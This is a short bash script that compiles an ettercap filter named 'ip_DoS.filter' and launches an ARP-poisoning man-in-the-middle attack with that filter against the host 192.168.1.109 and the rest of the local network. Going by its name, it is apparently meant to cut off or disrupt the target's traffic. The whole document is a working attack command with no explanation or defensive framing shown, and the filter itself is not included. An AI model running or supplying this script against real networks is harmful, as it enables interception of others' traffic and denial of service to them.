#!/bin/bash
sudo etterfilter ip_DoS.filter -o ip_DoS.ef
sudo ettercap -Tq -F ip_DoS.ef -M arp:remote /192.168.1.109/ //
